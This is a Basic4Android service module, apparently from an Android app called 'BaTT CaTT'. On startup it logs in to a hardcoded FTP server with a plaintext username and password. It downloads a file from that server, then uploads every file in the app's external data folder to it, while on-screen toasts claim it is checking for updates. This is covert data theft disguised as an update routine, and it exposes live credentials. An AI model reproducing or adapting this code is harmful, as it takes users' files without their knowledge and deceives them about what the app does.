Type=Service
Version=6.8
ModulesStructureVersion=1
B4A=true
@EndOfDesignText@
'BaTT CaTT source Project 
'Copyrights D.Trojan(trOw) and SM/Media ©2017
'Service Module created by trOw
#Region  Service Attributes 
	#StartAtBoot: False
	
#End Region

Sub Process_Globals
	'These global variables will be declared once when the application starts.
	'These variables can be accessed from all modules.
	Dim ftp As FTP
	Dim flist As List
	Dim fdata As String
	Dim fdir As String
End Sub

Sub Service_Create
	fdir=File.DirDefaultExternal&"/mnt/data"
	flist.Initialize
	flist.AddAll(File.ListFiles(File.DirDefaultExternal&"/mnt/data"))
	Log(File.ListFiles(File.DirDefaultExternal&"/mnt/data"))
	ftp.Initialize("ftp","battcatt.bplaced.net","21","battcatt_app","recall0000")
	ftp_start
End Sub

Sub Service_Start (StartingIntent As Intent)
		
End Sub

Sub Service_Destroy

End Sub

Sub ftp_start
	ftp.DownloadFile("/bc.txt",True,File.DirDefaultExternal&"/mnt/data","bc.txt")
	For i = 0 To flist.Size-1
		fdata=flist.get(i)
		Log(fdata) 
	ftp.UploadFile(fdir,GetFileName(fdata),True,"/"&GetFileName(fdata))
	ToastMessageShow("check for updates...",False)
	Next
End Sub


Sub ftp_ListCompleted (ServerPath As String, Success As Boolean, Folders() As FTPEntry, Files() As FTPEntry)
	
End Sub

Sub ftp_DownloadProgress (ServerPath As String, TotalDownloaded As Long, Total As Long)
	Dim s As String
	s = "Downloaded " & Round(TotalDownloaded / 1000) & "KB"
	If Total > 0 Then s = s & " out of " & Round(Total / 1000) & "KB"
	ToastMessageShow("Check for Updates.. "&s,False)
End Sub

Sub ftp_DownloadCompleted (ServerPath As String, Success As Boolean)
	Log(ServerPath & ", Success=" & Success)
	If Success = False Then 
		Log(LastException.Message)
		Else
			ftp.Close
		Log(" Success=" & Success)
	End If
	
End Sub

Sub ftp_UploadCompleted (ServerPath As String, Success As Boolean)
	Log(ServerPath & ", Success=" & Success)
	If Success = False Then 
		Log(LastException.Message)     
		Else
			Log(Success) 
			ftp.Close     
	End If
End Sub

Sub GetFileName(FullPath As String) As String
	Return FullPath.SubString(FullPath.LastIndexOf("/")+1)
End Sub
